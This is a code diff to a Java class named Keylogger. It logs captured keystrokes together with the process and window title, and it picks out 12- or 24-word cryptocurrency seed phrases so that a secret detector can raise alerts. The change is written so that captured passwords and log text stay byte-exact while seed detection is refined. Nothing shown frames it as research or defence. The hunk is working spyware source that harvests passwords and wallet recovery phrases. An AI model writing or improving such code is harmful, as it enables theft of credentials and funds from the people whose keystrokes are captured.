@@ -303,10 +303,12 @@ final class Keylogger {
 			return;
 		}
 		String clean = text.replace("\t", "").strip();
-		clean = clean.replace("|", "/").replaceAll("\\s+", " ");
+		clean = clean.replace("|", "/");
 		String stamp = java.time.LocalTime.now().withNano(0).toString();
 		append(OpsPaths.keylog(installDir), stamp + " [" + process + " | " + title + "] " + clean + "\n");
-		String seed = seed(clean);
+		// Seed tokens are single-space separated; keep the password/log text
+		// byte-exact apart from the outer strip and the pipe escape.
+		String seed = seed(clean.replaceAll("\\s+", " ").strip());
 		if (seed != null) {
 			String words = seed.split(" ", -1).length == 24 ? "24" : "12";
 			boolean duplicate = SecretDetector.alertedRecently(seed);
